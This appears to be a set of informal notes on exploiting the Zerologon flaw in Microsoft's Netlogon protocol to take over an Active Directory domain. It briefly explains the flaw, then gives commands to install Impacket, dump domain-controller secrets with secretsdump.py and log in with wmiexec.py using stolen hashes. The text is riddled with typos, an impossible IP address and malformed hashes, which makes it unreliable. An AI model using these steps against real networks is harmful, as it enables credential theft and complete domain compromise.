#zero Logon vuln. A move from zero to Domain admin in approcx one minute.


``MS-NRPC (microsoft Netlogon Remote Protocol)
- This is a critical componnet of AD that hnadles authentication for users and machines accounts.
- takez advantage od poor implemenmtation of cryptograhy.
-Hard coding of initialisation vector with zeros instead of random strings



## TESTING THE ZEROLOGON SCRIPT

- eXZPLOit the dvuln DC

** Remove Impacket**
_sudo apt remove --purge impacket-scripts python3-impacket_

"##run impacket in a virtual machine

```apt install python3-venv
python3 -m venv impacketEnv
source impacketEnv/bin/activate
git clone https://github.com/SecureAuthCorp/impacket /opt/impacket
cd /opt/impacket
pip3 install .
python3 setup.py install```


secretsdump.py -just-dc -no-pass sss\$@10.0.4.777

wmiexec.py xxxxxx/Adminxxxxxxx@10.5.0.0 -hashes aad3b4sssiiikakalad3b435b51404ee:3f3ef89roemskjemsm7fc23c20f65568